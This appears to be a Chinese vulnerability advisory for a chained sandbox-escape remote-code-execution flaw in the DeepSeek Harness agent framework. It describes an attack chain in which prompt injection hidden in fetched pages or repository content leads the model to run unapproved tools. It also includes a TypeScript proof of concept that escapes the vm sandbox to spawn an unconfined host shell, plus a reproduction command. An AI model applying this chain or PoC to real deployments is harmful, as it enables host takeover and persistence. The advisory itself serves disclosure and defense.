# QVD-2026-52646 — DeepSeek Harness 链式沙箱逃逸远程代码执行

> 系列归属：**DeepSeek Harness（DSH）** 上线 11 天内被奇安信披露的 5 个漏洞之一（开源当天 4 个中的第 4 个，评分最高）。

## 漏洞速览

| 项 | 内容 |
|---|---|
| 漏洞编号 | **QVD-2026-52646**（奇安信 CERT 验证，暂无 CVE） |
| 产品 | DeepSeek Harness（`deepseek-ai/deepseek-harness`） |
| 漏洞类型 | 链式沙箱逃逸远程代码执行（exec 逃逸 → 裸 subprocess → 无约束宿主进程执行） |
| 危害等级 | **CVSS 10.0（严重）** |
| 影响版本 | v0.1 开发者预览版（PoC 验证于 0.1.0-rc.5） |
| 披露时间 | 2026-08-13（奇安信 CERT） |
| 利用条件 | 默认配置即可利用，无需认证、无需用户交互 |

## 受影响范围

- 所有默认配置部署的 DSH 实例（默认组合下 `cordis_define` + `cordis_run` 零审批）。
- 公开报道：公网部署实例已有未认证 RCE PoC（`dsh2shell`）流传。

## 根因分析

把 V4（VM 沙箱逃逸）与 `subprocess` 服务结合，实现完全的远程代码执行。核心是一个 **seam 结构缺陷**：

> 约束（landlock / seatbelt / bwrap 的 argv 包装）只存在于 **shell 层**——`bash-sandbox` 在调用 `ctx.subprocess.spawn` 之前包装 argv（`packages/shell/bash-sandbox/src/index.ts:177-179`）；而 **subprocess seam 自身对约束一无所知**（`packages/subprocess/subprocess-local` 中没有任何 sandbox 引用）。

这是经典的“enforcement 落在某个 consumer 上，而不是落在执行点上”——其他调用者（或拿到 `ctx` 的逃逸代码）可以直接绕过。

## 利用机制 / 攻击链

```
恶意网页 / 仓库内容 / 被 fetch 的文档
        │  prompt injection（白字白底、元数据、0 宽字符等隐蔽藏法）
        ▼
模型调用 cordis_define + cordis_run（默认组合零审批——审批服务未接入默认工具调用链路，代码里留 TODO：权限功能待实现）
        │
        ▼
vm 沙箱运行模型代码 → execute(args, exec) 拿到宿主 exec（guard.ts:582-584）
        │
        ▼
exec.agent.ctx.get('subprocess').spawn(...) —— 无 landlock/seatbelt/bwrap 约束
        │
        ▼
宿主机任意命令执行（以当前用户权限）→ 持久化（patch 文件 + !!js 后门）→ 长期驻留
```

整个过程**无文件写入、无审批、不跨越沙箱边界**——写边界防线被整体绕过。

## PoC 分析

`exploit/poc-v4b-exec-escape-to-rce.ts`（来自 `zzszmyf/dsh-security-pocs`）让 vm 沙箱里的模型代码经逃逸 `ctx` 拿到裸 `subprocess` 服务并 spawn 宿主进程：

```ts
async execute(_args, exec) {
  const real = exec.agent.ctx
  const subprocess = real.get('subprocess')
  const handle = subprocess.spawn({
    argv: ['/bin/sh', '-c', 'echo unconfined-spawn > ${marker}'], cwd: '/', ...
  })
  await handle.done
  return 'spawned-and-exited'
}
// => [V4b] unconfined host process wrote marker: true
// => [V4b] marker content: "unconfined-spawn\n"
```

> 注：研究者还试过更隐蔽的链（逃逸 ctx → `loader.create` 带 `__jsExpr` 行），结果行被真实挂载但 `!!js` 未执行——因为 `interpolate` 的 `isJsExpr` 检查 `value instanceof Object`，而 vm-realm 构造的 config 对象不是宿主 `Object` 实例（realm 边界偶然挡住）。这是**脆弱防御**：只要 `isJsExpr` 改成 `typeof value === 'object'` 或 config 先经宿主 clone，路径立即打开。但 subprocess 链根本不需要 `!!js`。

## 复现步骤

前置：DeepSeek Harness 源码 checkout + Node ≥ 22.3 + pnpm。

```sh
DSH_CHECKOUT=/path/to/deepseek-harness pnpm exec tsx /path/to/dsh-security-pocs/poc-v4b-exec-escape-to-rce.ts
```

预期输出：`[V4b] unconfined host process wrote marker: true` / `[V4b] marker content: "unconfined-spawn\n"`。

## 修复方案

- **P0**：`SubprocessRuntime` **自身**做约束——约束应位于 seam 的执行点，而非“只有 bash-sandbox 调用它”的约定。
- **P1**：allowlist 动态插件 inject；把 define/run 接入审批管线。
- **P2**：boot 期检查“已加载配置目录 ∉ 可写 roots，重叠即失败”。

## 检测排查

- 检查 `~/.dsh/` 下 profile 是否出现可疑 `cordis.patch.yml` 改动（`!!js` 后门）；
- 检查宿主机异常进程、反向 shell 连接（如 4444 等非常用端口外连）、crontab 与自启动项；
- 审查会话日志中模型是否调用 `cordis_define` / `cordis_run` / 非预期工具。

## 时间线

- 2026-08-13：奇安信 CERT 披露并验证（QVD-2026-52646，CVSS 10.0 严重）。
- 2026-08-17：安天发布漏洞风险提示。
- 2026-08-20：官方发布 v0.1.0-rc.8。

## 参考资料

- 奇安信 CERT 披露（2026-08-13，QVD-2026-52646）
- PoC 仓库：https://github.com/zzszmyf/dsh-security-pocs （`poc-v4b-exec-escape-to-rce.ts`）
- 分析长文：《插件、沙箱与一个总钥匙：DeepSeek Harness 四个安全漏洞的发现与利用实录》

## 免责声明

本资料仅供授权安全研究与防御目的。请勿对已不拥有的系统运行相关 PoC。
